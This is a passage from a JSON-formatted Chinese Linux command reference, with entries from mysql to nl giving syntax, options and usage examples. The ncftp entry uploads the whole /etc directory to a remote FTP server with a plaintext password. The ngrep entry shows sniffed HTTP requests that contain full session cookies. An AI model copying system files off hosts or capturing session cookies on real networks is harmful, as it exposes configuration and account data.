.\n```\n\n\n"},{"name":"mysql","categoryId":0,"data":"mysql\n\u003d\u003d\u003d\n\nMySQL服务器客户端工具\n\n## 补充说明\n\n**mysql命令** 是MySQL数据库服务器的客户端工具，它工作在命令行终端中，完成对远程MySQL数据库服务器的操作。\n\n### 语法  \n\n```\nmysql(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：MySQL服务器的ip地址或主机名；\n-u：连接MySQL服务器的用户名；\n-e：执行mysql内部命令；\n-p：连接MySQL服务器的密码。\n```\n\n### 参数  \n\n数据库：指定连接服务器后自动打开的数据库。\n\n\n"},{"name":"mysqladmin","categoryId":0,"data":"mysqladmin\n\u003d\u003d\u003d\n\nMySQL服务器管理客户端\n\n## 补充说明\n\n**mysqladmin命令** 是mysql服务器管理任务的客户端工具，它可以检查mytsql服务器的配置和当前工作状态，创建和删除数据库，创建用户和修改用户密码等操作。\n\n### 语法  \n\n```\nmysqladmin(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：MySQL服务器主机名或ip地址；\n-u：连接MySQL服务器的用户名；\n-p：连接MySQL服务器的密码；\n--help：显示帮助信息。\n```\n\n### 参数  \n\n管理命令：需要在MySQL服务器上执行的管理命令。\n\n **mysqladmin支持下列命令：** \n\n```\ncreate databasename：创建一个新数据库；\ndrop databasename：删除一个数据库及其所有表；\nextended-status：给出服务器的一个扩展状态消息；\nflush-hosts：清空所有缓存的主机；\nflush-logs：清空所有日志；\nflush-tables：清空所有表；\nflush-privileges：再次装载授权表(同reload)；\nkill id,id,...：杀死mysql线程；\npassword 新口令：将老密码改为新密码；\nping：检查mysqld是否活着；\nprocesslist：显示服务其中活跃线程列表；\nreload：重载授权表；\nrefresh：清空所有表并关闭和打开日志文件；\nshutdown：关掉服务器；\nstatus：给出服务器的简短状态消息；\nvariables：打印出可用变量；\nversion：得到服务器的版本信息。\n```\n\n\n"},{"name":"mysqldump","categoryId":0,"data":"mysqldump\n\u003d\u003d\u003d\n\nMySQL数据库中备份工具\n\n## 补充说明\n\n**mysqldump命令** 是mysql数据库中备份工具，用于将MySQL服务器中的数据库以标准的sql语言的方式导出，并保存到文件中。\n\n### 语法  \n\n```\nmysqldump(选项)\n```\n\n### 选项  \n\n```\n--add-drop-table：在每个创建数据库表语句前添加删除数据库表的语句；\n--add-locks：备份数据库表时锁定数据库表；\n--all-databases：备份MySQL服务器上的所有数据库；\n--comments：添加注释信息；\n--compact：压缩模式，产生更少的输出；\n--complete-insert：输出完成的插入语句；\n--databases：指定要备份的数据库；\n--default-character-set：指定默认字符集；\n--force：当出现错误时仍然继续备份操作；\n--host：指定要备份数据库的服务器；\n--lock-tables：备份前，锁定所有数据库表；\n--no-create-db：禁止生成创建数据库语句；\n--no-create-info：禁止生成创建数据库库表语句；\n--password：连接MySQL服务器的密码；\n--port：MySQL服务器的端口号；\n--user：连接MySQL服务器的用户名。\n```\n\n### 实例  \n\n **导出整个数据库** \n\n```\nmysqldump -u 用户名 -p 数据库名 \u003e 导出的文件名\nmysqldump -u linuxde -p smgp_apps_linuxde \u003e linuxde.sql\n```\n\n **导出一个表** \n\n```\nmysqldump -u 用户名 -p 数据库名 表名\u003e 导出的文件名\nmysqldump -u linuxde -p smgp_apps_linuxde users \u003e linuxde_users.sql\n```\n\n **导出一个数据库结构** \n\n```\nmysqldump -u linuxde -p -d --add-drop-table smgp_apps_linuxde \u003e linuxde_db.sql\n```\n\n`-d`没有数据，`--add-drop-tabl`e每个create语句之前增加一个`drop table`\n\n\n"},{"name":"mysqlimport","categoryId":0,"data":"mysqlimport\n\u003d\u003d\u003d\n\n为MySQL服务器用命令行方式导入数据\n\n## 补充说明\n\n**mysqlimport命令** 为mysql数据库服务器提供了一种命令行方式导入数据工具，它从特定格式的文本文件中读取数据插入MySQL数据库表中。\n\n### 语法  \n\n```\nmysqlimport(选项)(参数)\n```\n\n### 选项  \n\n```\n-D：导入数据前清空表；\n-f：出现错误时继续处理剩余的操作；\n-h：MySQL服务器的ip地址或主机名；\n-u：连接MySQL服务器的用户名；\n-p：连接MySQL服务器的密码。\n```\n\n### 参数  \n\n*   数据库名：指定要导入的数据库名称；\n*   文本文件：包含特定格式文本文件。\n\n\n"},{"name":"mysqlshow","categoryId":0,"data":"mysqlshow\n\u003d\u003d\u003d\n\n显示MySQL中数据库相关信息\n\n## 补充说明\n\n**mysqlshow命令** 用于显示mysql服务器中数据库、表和列表信息。\n\n### 语法  \n\n```\nmysqlshow(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：MySQL服务器的ip地址或主机名；\n-u：连接MySQL服务器的用户名；\n-p：连接MySQL服务器的密码；\n--count：显示每个数据表中数据的行数；\n-k：显示数据表的索引；\n-t：显示数据表的类型；\n-i：显示数据表的额外信息。\n```\n\n### 参数  \n\n数据库信息：指定要显示的数据库信息，可以是一个数据库名，或者是数据库名和表名，或者是数据库名、表名和列名。\n\n\n"},{"name":"nano","categoryId":0,"data":"nano\n\u003d\u003d\u003d\n\n字符终端文本编辑器\n\n## 补充说明\n\n**nano** 是一个字符终端的文本编辑器，有点像DOS下的editor程序。它比vi/vim要简单得多，比较适合Linux初学者使用。某些Linux发行版的默认编辑器就是nano。\n\nnano命令可以打开指定文件进行编辑，默认情况下它会自动断行，即在一行中输入过长的内容时自动拆分成几行，但用这种方式来处理某些文件可能会带来问题，比如Linux系统的配置文件，自动断行就会使本来只能写在一行上的内容折断成多行了，有可能造成系统不灵了。因此，如果你想避免这种情况出现，就加上`-w`选项吧。\n\n### 语法  \n\n```\nnano [选项] [[+行,列] 文件名]...\n```\n\n### 选项  \n\n```\n -h, -?         --help                  显示此信息\n +行,列                                 从所指列数与行数开始\n -A             --smarthome             启用智能 HOME 键\n -B             --backup                储存既有文件的备份\n -C \u003c目录\u003e      --backupdir\u003d\u003c目录\u003e      用以储存独一备份文件的目录\n -D             --boldtext              用粗体替代颜色反转\n -E             --tabstospaces          将已输入的制表符转换为空白\n -F             --multibuffer           启用多重文件缓冲区功能\n -H             --historylog            记录与读取搜索/替换的历史字符串\n -I             --ignorercfiles         不要参考nanorc 文件\n -K             --rebindkeypad          修正数字键区按键混淆问题\n -L             --nonewlines            不要将换行加到文件末端\n -N             --noconvert             不要从 DOS/Mac 格式转换\n -O             --morespace             编辑时多使用一行\n -Q \u003c字符串\u003e    --quotestr\u003d\u003c字符串\u003e     引用代表字符串\n -R             --restricted            限制模式\n -S             --smooth                按行滚动而不是半屏\n -T \u003c#列数\u003e     --tabsize\u003d\u003c#列数\u003e       设定制表符宽度为 #列数\n -U             --quickblank            状态行快速闪动\n -V             --version               显示版本资讯并离开\n -W             --wordbounds            更正确地侦测单字边界\n -Y \u003c字符串\u003e    --syntax\u003d\u003c字符串\u003e       用于加亮的语法定义\n -c             --const                 持续显示游标位置\n -d             --rebinddelete          修正退格键/删除键混淆问题\n -i             --autoindent            自动缩进新行\n -k             --cut                   从游标剪切至行尾\n -l             --nofollow              不要依照符号连结，而是覆盖\n -m             --mouse                 启用鼠标功能\n -o \u003c目录\u003e      --operatingdir\u003d\u003c目录\u003e   设定操作目录\n -p             --preserve              保留XON (^Q) 和XOFF (^S) 按键\n -q             --quiet                 沉默忽略启动问题, 比如rc 文件错误\n -r \u003c#列数\u003e     --fill\u003d\u003c#列数\u003e          设定折行宽度为 #列数\n -s \u003c程序\u003e      --speller\u003d\u003c程序\u003e        启用替代的拼写检查程序\n -t             --tempfile              离开时自动储存，不要提示\n -u             --undo                  允许通用撤销[试验性特性]\n -v             --view                  查看(只读)模式\n -w             --nowrap                不要自动换行\n -x             --nohelp                不要显示辅助区\n -z             --suspend               启用暂停功能\n -$             --softwrap              启用软换行\n -a, -b, -e,\n -f, -g, -j                             (忽略，为与pico 相容)\n```\n\n### 用法  \n\n **光标控制** \n\n*   移动光标：使用用方向键移动。\n*   选择文字：按住鼠标左键拖到。\n\n **复制、剪贴和粘贴** \n\n*   复制一整行：Alt+6\n*   剪贴一整行：Ctrl+K\n\n **粘贴：Ctrl+U** \n\n如果需要复制／剪贴多行或者一行中的一部分，先将光标移动到需要复制／剪贴的文本的开头，按Ctrl+6（或者Alt+A）做标记，然后移动光标到 待复制／剪贴的文本末尾。这时选定的文本会反白，用Alt+6来复制，Ctrl+K来剪贴。若在选择文本过程中要取消，只需要再按一次Ctrl+6。\n\n **搜索** \n\n按Ctrl+W，然后输入你要搜索的关键字，回车确定。这将会定位到第一个匹配的文本，接着可以用Alt+W来定位到下一个匹配的文本。\n\n **翻页** \n\n*   Ctrl+Y到上一页\n*   Ctrl+V到下一页\n\n **保存** \n\n使用Ctrl+O来保存所做的修改\n\n **退出** \n\n按Ctrl+X\n\n如果你修改了文件，下面会询问你是否需要保存修改。输入Y确认保存，输入N不保存，按Ctrl+C取消返回。如果输入了Y，下一步会让你输入想要保存的文件名。如果不需要修改文件名直接回车就行；若想要保存成别的名字（也就是另存为）则输入新名称然后确 定。这个时候也可用Ctrl+C来取消返回。\n\n\n"},{"name":"ncftp","categoryId":7,"data":"ncftp\n\u003d\u003d\u003d\n\n是增强的的FTP工具\n\n## 补充说明\n\n**ncftp命令** 是增强的的ftp工具，比传统的FTP指令更加强大。FTP让用户得以下载存放于服务器主机的文件，也能将文件上传到远端主机放置。ncftp是文字模式FTP程序的佼佼者，它具备多样特色，包括显示传输速率，下载进度，自动续传，标住书签，可通过防火墙和代理服务器等。\n\n### 语法  \n\n```\nncftp(选项)(参数)\n```\n\n### 选项  \n\n```\n-u：指定登录FTP服务器时使用的用户名；\n-p：指定登录FTP服务器时使用的密码；\n-P：如果FTP服务器没有使用默认的TCP协议的21端口，则使用此选项指定FTP服务器的端口号。\n-m：在传之前尝试在目录位置创建目录(用于传目录的情况)\n-R：递规传子目录\n```\n\n### 参数  \n\nFTP服务器：指定远程FTP服务器的ip地址或主机名。\n\n### 安装  \n\n```\nwget ftp://ftp.ncftp.com/ncftp/ncftp-3.2.3-src.tar.gz\ntar zxvf ncftp-3.2.3-src.tar.gz\ncd ncftp-3.2.3/\n./configure --prefix\u003d/usr/local/ncftp\nmake \u0026\u0026 make install\n```\n\n### 实例  \n\n将本地/etc/目录内的所有文件和目录，上传到FTP服务器的flv/games/目录内(如果不存在flv/games/目录则自动创建)。\n\n```\n/usr/local/ncftp/bin/ncftpput -u koumm -p koumm -P 21 -m -R 192.168.162.137  flv/games/ /etc/*\n```\n\n **指令说明** \n\nncftp的基本命令和普通ftp一样，可以输入help获得命令列表。对于所有的命令，都可以使用help \u003c命令\u003e的格式获得详细帮助。l开头的就是对本地执行的命令，其它的就是对登入的ftp服务目录的操作命令。\n\n增加的本地文件系统的操作命令：\n\n*   lls: 列出本地当前目录文件；\n*   lmkdir : 本地建立目录；\n*   lrename: 本地文件改名；\n*   lpwd: 显示当前本地路 径；\n*   lchmod: 改变本地文件权限；\n*   lpage: 显示本地文件内容；\n*   lrm: 删除本地文件；\n*   lrmdir: 删除本地目录。\n\n\n"},{"name":"nethogs","categoryId":0,"data":"nethogs\n\u003d\u003d\u003d\n\n终端下的网络流量监控工具\n\n## 补充说明\n\n有很多适用于Linux系统的开源网络监视工具。比如说，你可以用命令iftop来检查带宽使用情况。netstat用来查看接口统计报告，还有top监控系统当前运行进程。但是如果你想要找一个能够按进程实时统计网络带宽利用率的工具，那么NetHogs值得一看。\n\n **NetHogs** 是一个开源的命令行工具（类似于Linux的top命令），用来按进程或程序实时统计网络带宽使用率。\n\n来自NetHogs项目网站:\n\n\u003e NetHogs是一个小型的net top工具，不像大多数工具那样拖慢每个协议或者是每个子网的速度而是按照进程进行带宽分组。NetHogs不需要依赖载入某个特殊的内核模块。如果发生了网络阻塞你可以启动NetHogs立即看到哪个PID造成的这种状况。这样就很容易找出哪个程序跑飞了然后突然占用你的带宽。\n\n本文为你介绍如何在Unix/Linux操作系统下如何安装和使用NetHogs按进程监控网络带宽使用率。\n\n### 在RHEL、CentOS和Fedora下安装NetHogs  \n\n要安装NetHogs，你必须要启用你所用Linux下的EPEL源。然后运行下面的yum命令下载安装NetHogs包。\n\n```\n# yum install nethogs\n\n```\n\n### 在Ubuntu、Linux mint和Debian下安装NetHogs  \n\n键入apt-get命令安装NetHogs包：\n\n```\n$ sudo apt-get install nethogs\n\n```\n\n### NetHogs用法  \n\n在基于RedHat系统下键入如下命令启动NetHogs工具。\n\n```\n# nethogs\n\n```\n\n在Debian/Ubuntu/Linux Mint下要执行NetHogs你必须拥有root权限：\n\n```\n$ sudo nethogs\n\n```\n\n!nethogs\n\nUbuntu 12.10 下的NetHogs预览\n\n正如上图所示，send列和received列显示的是按照每个进程的流量统计。总的收发数据带宽在最下方，而且可以用交互命令控制排序，下面将要讨论这些交互命令。\n\n### NetHogs 命令行参数  \n\n以下就是NetHogs命令行的参数，用-d来添加刷新频率参数，device name 用来检测给定的某个或者某些设备的带宽（默认是eth0）。例如：设置5秒钟的刷新频率，键入如下命令即可：\n\n```\n# nethogs -d 5\n\n```\n\n```\n$ sudo nethogs -d 5\n\n```\n\n如果只用来监视设备（eth0）的网络带宽可以使用如下命令：\n\n```\n# nethogs eth0\n\n```\n\n```\n$ sudo nethogs eth0\n\n```\n\n如果要同时监视eth0和eth1接口，使用以下命令即可：\n\n```\n# nethogs eth0 eth1\n\n```\n\n```\n$ sudo nethogs eth0 eth1\n\n```\n\n其他参数和用法\n\n```\n-d : 刷新间隔\n-h : 帮助\n-p : promiscious 模式\n-t : trace模式 \n-V : 版本\n\n```\n\n### 交互命令  \n\n以下是NetHogs的一些交互命令（键盘快捷键）\n\n*   m : 修改单位\n*   r : 按流量排序\n*   s : 按发送流量排序\n*   q : 退出命令提示符\n\n关于NetHogs命令行工具的完整参数列表，可以参考NetHogs的手册，使用方法是在终端里输入`man nethogs`或者`sudo man nethogs`，更多信息请参考NetHogs项目主页。\n\n\n"},{"name":"netstat","categoryId":9,"data":"netstat\n\u003d\u003d\u003d\n\n查看Linux中网络系统状态信息\n\n## 补充说明\n\n**netstat命令** 用来打印Linux中网络系统的状态信息，可让你得知整个Linux系统的网络情况。\n\n### 语法  \n\n```\nnetstat(选项)\n```\n\n### 选项  \n\n```\n-a或--all：显示所有连线中的Socket；\n-A\u003c网络类型\u003e或--\u003c网络类型\u003e：列出该网络类型连线中的相关地址；\n-c或--continuous：持续列出网络状态；\n-C或--cache：显示路由器配置的快取信息；\n-e或--extend：显示网络其他相关信息；\n-F或--fib：显示FIB；\n-g或--groups：显示多重广播功能群组组员名单；\n-h或--help：在线帮助；\n-i或--interfaces：显示网络界面信息表单；\n-l或--listening：显示监控中的服务器的Socket；\n-M或--masquerade：显示伪装的网络连线；\n-n或--numeric：直接使用ip地址，而不通过域名服务器；\n-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；\n-o或--timers：显示计时器；\n-p或--programs：显示正在使用Socket的程序识别码和程序名称；\n-r或--route：显示Routing Table；\n-s或--statistice：显示网络工作信息统计表；\n-t或--tcp：显示TCP传输协议的连线状况；\n-u或--udp：显示UDP传输协议的连线状况；\n-v或--verbose：显示指令执行过程；\n-V或--version：显示版本信息；\n-w或--raw：显示RAW传输协议的连线状况；\n-x或--unix：此参数的效果和指定\"-A unix\"参数相同；\n--ip或--inet：此参数的效果和指定\"-A inet\"参数相同。\n```\n\n### 实例  \n\n **列出所有端口 (包括监听和未监听的)** \n\n```\nnetstat -a     #列出所有端口\nnetstat -at    #列出所有tcp端口\nnetstat -au    #列出所有udp端口                             \n```\n\n **列出所有处于监听状态的 Sockets** \n\n```\nnetstat -l        #只显示监听端口\nnetstat -lt       #只列出所有监听 tcp 端口\nnetstat -lu       #只列出所有监听 udp 端口\nnetstat -lx       #只列出所有监听 UNIX 端口\n```\n\n **显示每个协议的统计信息** \n\n```\nnetstat -s   显示所有端口的统计信息\nnetstat -st   显示TCP端口的统计信息\nnetstat -su   显示UDP端口的统计信息\n\n```\n\n **在netstat输出中显示 PID 和进程名称** \n\n```\nnetstat -pt\n```\n\n`netstat -p`可以与其它开关一起使用，就可以添加“PID/进程名称”到netstat输出中，这样debugging的时候可以很方便的发现特定端口运行的程序。\n\n **在netstat输出中不显示主机，端口和用户名(host, port or user)** \n\n当你不想让主机，端口和用户名显示，使用`netstat -n`。将会使用数字代替那些名称。同样可以加速输出，因为不用进行比对查询。\n\n```\nnetstat -an\n```\n\n如果只是不想让这三个名称中的一个被显示，使用以下命令:\n\n```\nnetsat -a --numeric-ports\nnetsat -a --numeric-hosts\nnetsat -a --numeric-users\n```\n\n **持续输出netstat信息** \n\n```\nnetstat -c   #每隔一秒输出网络信息\n```\n\n **显示系统不支持的地址族(Address Families)** \n\n```\nnetstat --verbose\n```\n\n在输出的末尾，会有如下的信息：\n\n```\nnetstat: no support for `AF IPX\u0027 on this system.\nnetstat: no support for `AF AX25\u0027 on this system.\nnetstat: no support for `AF X25\u0027 on this system.\nnetstat: no support for `AF NETROM\u0027 on this system.\n```\n\n **显示核心路由信息** \n\n```\nnetstat -r\n```\n\n使用`netstat -rn`显示数字格式，不查询主机名称。\n\n **找出程序运行的端口** \n\n并不是所有的进程都能找到，没有权限的会不显示，使用 root 权限查看所有的信息。\n\n```\nnetstat -ap | grep ssh\n```\n\n找出运行在指定端口的进程：\n\n```\nnetstat -an | grep \u0027:80\u0027\n```\n\n **显示网络接口列表** \n\n```\nnetstat -i\n```\n\n显示详细信息，像是ifconfig使用`netstat -ie`。\n\n **IP和TCP分析** \n\n查看连接某服务端口最多的的IP地址：\n\n```\nnetstat -ntu | grep :80 | awk \u0027{print $5}\u0027 | cut -d: -f1 | awk \u0027{++ip[$1]} END {for(i in ip) print ip[i],\"\\t\",i}\u0027 | sort -nr\n```\n\nTCP各种状态列表：\n\n```\nnetstat -nt | grep -e 127.0.0.1 -e 0.0.0.0 -e ::: -v | awk \u0027/^tcp/ {++state[$NF]} END {for(i in state) print i,\"\\t\",state[i]}\u0027\n```\n\n查看phpcgi进程数，如果接近预设值，说明不够用，需要增加：\n\n```\nnetstat -anpo | grep \"php-cgi\" | wc -l\n```\n\n\n"},{"name":"newusers","categoryId":0,"data":"newusers\n\u003d\u003d\u003d\n\n用于批处理的方式一次创建多个命令\n\n## 补充说明\n\n**newusers命令** 用于批处理的方式一次创建多个命令。\n\n### 语法  \n\n```\nnewusers(参数)\n```\n\n### 参数  \n\n用户文件：指定包含用户信息的文本文件，文件的格式要与`/etc/passwd`相同。\n\n### 实例  \n\n实用newusers命令批量添加用户：\n\n用法很简单，newusers后面直接跟一个文件，文件格式和`/etc/passwd`的格式相同。\n\n```\n用户名1:x:UID:GID:用户说明:用户的家目录:所用SHELL\n```\n\n举例：\n\n```\njingang0:x:520:520::/home/jingang0:/sbin/nologin\njingang1:x:521:521::/home/jingang1:/sbin/nologin\n......\n```\n\n值得一提的是关于SHELL类型，查看主机上所有SHELL，可以通过chsh来查看：\n\n```\n[root@localhost beinan]# chsh --list\n/bin/sh\n/bin/bash\n/sbin/nologin\n/bin/ksh\n/bin/tcsh\n/bin/csh\n/bin/zsh\n```\n\n其中除了`/sbin/nologin`，其它类型的SHELL都能登录系统，nologin大多是虚拟用户用的SHELL，也就是说虽然他是系统用户，但他并无登录系统的权限；如果您想添加这类用户，就把他的SHELL设置成`/sbin/nologin`，比如上面的例子。\n\n关于用户名、UID、GID及用户的家目录是怎么回事，您可以读相应的参考文档。\n\n\n"},{"name":"nfsstat","categoryId":0,"data":"nfsstat\n\u003d\u003d\u003d\n\n列出NFS客户端和服务器的工作状态\n\n## 补充说明\n\n**nfsstat命令** 用于列出NFS客户端和服务器的工作状态。\n\n### 语法  \n\n```\nnfsstat(选项)\n```\n\n### 选项  \n\n```\n-s：仅列出NFS服务器端状态；\n-c：仅列出NFS客户端状态；\n-n：仅列出NFS状态，默认显示nfs客户端和服务器的状态；\n-2：仅列出NFS版本2的状态；\n-3：仅列出NFS版本3的状态；\n-4：仅列出NFS版本4的状态；\n-m：打印以加载的nfs文件系统状态；\n-r：仅打印rpc状态。\n```\n\n### 实例  \n\n要显示关于客户机发送和拒绝的RPC和NFS调用数目的信息，输入：\n\n```\nnfsstat -c\n```\n\n要显示和打印与客户机NFS调用相关的信息，输入如下命令：\n\n```\nnfsstat -cn\n```\n\n要显示和打印客户机和服务器的与RPC调用相关的信息，输入如下命令：\n\n```\nnfsstat -r\n```\n\n要显示关于服务器接收和拒绝的RPC和NFS调用数目的信息，输入如下命令：\n\n```\nnfsstat –s\n```\n\n\n"},{"name":"ngrep","categoryId":0,"data":"ngrep\n\u003d\u003d\u003d\n\n方便的数据包匹配和显示工具\n\n## 补充说明\n\n**ngrep命令** 是grep命令的网络版，他力求更多的grep特征，用于搜寻指定的数据包。正由于安装ngrep需用到libpcap库， 所以支持大量的操作系统和网络协议。能识别TCP、UDP和ICMP包，理解bpf的过滤机制。\n\n### 安装  \n\nngrep命令的下载地址：http://ngrep.sourceforge.net/，libpcap下载地址：http://www.tcpdump.org/。先用`yum install libpcap`完全安装libpcap，注意有时候用libpcap安装包安装的不完整会影响ngrep的使用。\n\n如果yum无法安装就用以下步骤安装libpcap：\n\n```\nwget http://www.tcpdump.org/release/libpcap-1.3.0.tar.gz\ntar -zxf libpcap-1.3.0.tar.gz\ncd libpcap-1.3.0\n./configure\nmake \u0026\u0026 make install\n```\n\nngrep的安装就是 configure/make/make install 三部曲。\n\n注：configure时是遇到 please wipe out all unused pcap installations，添加以下选项：\n\n```\n./configure --with-pcap-includes\u003d/usr/local/include/pcap\n```\n\n在安装后输入ngrep来验证下安装是否成功。\n\n### 语法  \n\n```\nngrep \u003c-LhNXViwqpevxlDtTRM\u003e \u003c-IO pcap_dump\u003e \u003c-n num\u003e \u003c-d dev\u003e \u003c-A num\u003e\n\u003c-s snaplen\u003e \u003c-S limitlen\u003e \u003c-w normal|byline|single|none\u003e \u003c-c cols\u003e\n\u003c-P char\u003e \u003c-F file\u003e \u003cmatch expression\u003e \u003cbpf filter\u003e\n```\n\n### 选项  \n\n```\n-e ：显示空数据包\n-i ：忽略大小写\n-v ：反转匹配\n-R ：don\u0027t do privilege revocation logic\n-x ：以16进制格式显示\n-X ：以16进制格式匹配\n-w ：整字匹配\n-p ：不使用混杂模式\n-l ：make stdout line buffered\n-D ：replay pcap_dumps with their recorded time intervals\n-t ：在每个匹配的包之前显示时间戳\n-T ：显示上一个匹配的数据包之间的时间间隔\n-M ：仅进行单行匹配\n-I ：从文件中读取数据进行匹配\n-O ：将匹配的数据保存到文件\n-n ：仅捕获指定数目的数据包进行查看\n-A ：匹配到数据包后dump随后的指定数目的数据包\n-s ：set the bpf caplen\n-S ：set the limitlen on matched packets\n-W ：设置显示格式byline将解析包中的换行符\n-c ：强制显示列的宽度\n-P ：set the non-printable display char to what is specified\n-F ：使用文件中定义的bpf(Berkeley Packet Filter)\n-N ：显示由IANA定义的子协议号\n-d ：使用哪个网卡，可以用-L选项查询\n-L ：查询网卡接口\n```\n\n### 实例  \n\n捕捉cloudian：18080端口的request和response，`-W byline`用来解析包中的换行符，否则包里的所有数据都是连续的，可读性差。`-d lo`是监听本地网卡：\n\n```\nngrep -W byline -d lo port 18080\n```\n\n捕捉amazon：80端口的request和response。`-d eth0是`用来监听对外的网卡：\n\n```\nngrep -W byline -d eth0 port 80\n```\n\n可以用`-d any`来捕捉所有的包：\n\n```\nngrep \u0027[a-zA-Z]\u0027 -t -W byline -d any tcp port 18080\n```\n\n捕获字符串`.flv`，比如要查看在Web Flash 视频中的.flv文件的下载地址：\n\n```\nngrep -d3 -N -q \\.flv\ninterface: \\Device\\TNT_40_1_{670F6B50-0A13-4BAB-9D9E-994A833F5BA9} (10.132.0.0/2\n55.255.192.0)\nmatch: \\.flv\n```\n\n打开一个视频页面：\n\n```\nT(6) 10.132.34.23:24860 -\u003e 61.142.208.154:80 [AP]\nGET /f59.c31.56.com/flvdownload/12/19/ggyg7741@56.com_56flv_zhajm_119556973\n97.flv HTTP/1.1..accept: */*..Referer: http://www.56.com/flashApp/v_player_\nsite.swf..x-flash-version: 9,0,45,0..UA-CPU: x86..Accept-Encoding: gzip, de\nflate..User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET\nCLR 2.0.50727; .NET CLR 3.0.04506.30)..host: f59.r.56.com..Connection: Keep\n-Alive..Cookie: whistoryview\u003d23423759-23635627-23423344-23171935-23058374-2\n3081156-23207350-22395727-; geoip\u003d............; wl_all_s\u003dy....\n```\n\nOK。地址已经找到了,就是http://f59.c31.56.com/flvdownload/12/19/ggyg7741@56.com_56flv_zhajm_11955697397.flv\n\n加个`-W byline`参数后,将解析包中的换行符：\n\n```\nT(6) 2007/11/25 15:56:12.192619 10.132.34.23:26365 -\u003e 59.151.21.101:80 [AP]\nGET /aa.flv HTTP/1.1.\nAccept: */*.\nAccept-Language: zh-cn.\nUA-CPU: x86.\nAccept-Encoding: gzip, deflate.\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.5072\n7; .NET CLR 3.0.04506.30).\nHost: www.google.cn.\nConnection: Keep-Alive.\nCookie: PREF\u003did\u003da0b2932c336477e9:TB\u003d4:NW\u003d1:TM\u003d1187877372:LM\u003d1187956074:S\u003dY1Fzndp\nrT3vFo7ac; SID\u003dDQAAAHcAAABJCEXeOVLHu2rIfb5BfKP3GG9PbhJDEkXsLTV8y0f_lvSd2Y46Q0FPt\n83CnEs9rxA1xBDM9mLR8-ckWeScyOQA8PyYnX5u5OjFvjfRbDg_FDZfwxhRzqS9KPZv26pjnsUxs0FDM\n1xpJ5AgDn38pXtlCdkksJ0-cbiIWoA61oHWMg; NID\u003d7\u003dAvJxn5B6YOLLxoYz4LLzhIbNsQUQiulRS6U\nJGxdBniQBmXm99y7L-NBNORN82N3unmZSGHFPfePVHnLK2MjYjglyXZhU9x7ETXNBnY3NurNijHDhJ7K\nyi7E53UBOcv4V.\n```\n\n\n"},{"name":"nice","categoryId":2,"data":"nice\n\u003d\u003d\u003d\n\n改变程序执行的优先权等级\n\n## 补充说明\n\n**nice命令** 用于以指定的进程调度优先级启动其他的程序。\n\n### 语法  \n\n```\nnice(选项)(参数)\n```\n\n### 选项  \n\n```\n-n：指定进程的优先级（整数）。\n```\n\n### 参数  \n\n指令及选项：需要运行的指令及其他选项。\n\n### 实例  \n\n新建一个进程并设置优先级，将当前目录下的documents目录打包，但不希望tar占用太多CPU：\n\n```\nnice -19 tar zcf pack.tar.gz documents\n```\n\n方法非常简单，即在原命令前加上`nice -19`。很多人可能有疑问了，最低优先级不是19么？那是因为这个“-19”中的“-”仅表示参数前缀；所以，如果希望将当前目录下的documents目录打包，并且赋予tar进程最高的优先级：\n\n```\nnice --19 tar zcf pack.tar.gz documents\n```\n\n\n"},{"name":"nisdomainname","categoryId":0,"data":"nisdomainname\n\u003d\u003d\u003d\n\n显示主机NIS的域名\n\n## 补充说明\n\n**nisdomainname命令** 用于显示主机NIS的域名。\n\n### 语法  \n\n```\nnisdomainname(选项)\n```\n\n### 选项  \n\n```\n-v：详细信息模式。\n```\n\n\n"},{"name":"nl","categoryId":0,"data":"nl\n\u003d\u003d\u003d\n\n在Linux系统中计算文件内容行号\n\n## 补充说明\n\n**nl命令** 读取 file 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。在输出中，nl命令根据您在命令行中指定的标志来计算左边的行。输入文本必须写在逻辑页中。每个逻辑页有头、主体和页脚节（可以有空节）。除非使用`-p`选项，nl 命令在每个逻辑页开始的地方重新设置行号。可以单独为头、主体和页脚节设置行计算标志（例如，头和页脚行可以被计算然而文本行不能）。其默认的结果与`cat -n`有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐0等等的功能。\n\n### 语法  \n\n```\nnl (选项) (参数)\n```\n\n### 选项  \n\n```\n-b ：指定行号指定的方式，主要有两种：\n    -b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；\n    -b t ：如果有空行，空的那一行不要列出行号(默认值)；\n\n-n ：列出行号表示的方法，主要有三种：\n    -n ln ：行号在萤幕的最左方显示；\n    -n rn ：行号在自己栏位的最右方显示，且不加 0 ；\n    -n rz ：行号在自己栏位的最右方显示，且加 0 ；\n\n-w ：行号栏位的占用的位数。\n-p ：在逻辑定界符处不重新开始计算。\n```\n\n### 实例  \n\n **用 nl 列出 log2015.log 的内容** ：\n\n```\nroot@localhost [test]# nl log2015.log\n1 2015-01\n2 2015-02\n\n3 \u003d\u003d\u003d\u003d\u003d\u003d[root@localhost test]#\n```\n\n说明：文件中的空白行，nl 不会加上行号\n\n **用 nl 列出 log2015.log 的内容，空本行也加上行号** ：\n\n```\n[root@localhost test]# nl -b a log2015.log\n1 2015-01\n2 2015-02\n3\n4\n5 \u003d\u003d\u003d\u003d\u003d\u003d[root@localhost test]#\n```\n\n **让行号前面自动补上0，统一输出格式：** \n\n```\n[root@localhost test]# nl -b a -n rz log2015.log\n000001 2015-01\n000002 2015-02\n000003 2015-03\n000004 2015-04\n000005 2015-05\n000006 2015-06\n000007 2015-07\n000008 2015-08\n000009 2015-09\n000010 2015-10\n000011 2015-11\n000012 2015-12\n000013 \u003d\u003d\u003d\u003d\u003d\u003d\u003d\n\n[root@localhost test]# nl -b a -n rz -w 3 log2015.log\n001 2015-01\n002 2015-02\n003 2015-03\n004 2015-04\n005 2015-05\n006 2015-06\n007 2015-07\n008 2015-08\n009 2015-09\n010 2015-10\n011 2015-11\n012 2015-12\n013 \u003d\u003d\u003d\u003d\u003d\u003d\u003d\n```\n\n说明：`nl -b a -n rz`命令行号默认为六位，要调整位数可以加上参数`-w 3`调整为3位。\n\n\n"},{"name":"nm","categoryId":0,"data":"nm\n\u003d\u003d\u003d\n\n显示二进制目标文件的符号表\n\n## 补充说明\n\n**nm命令** 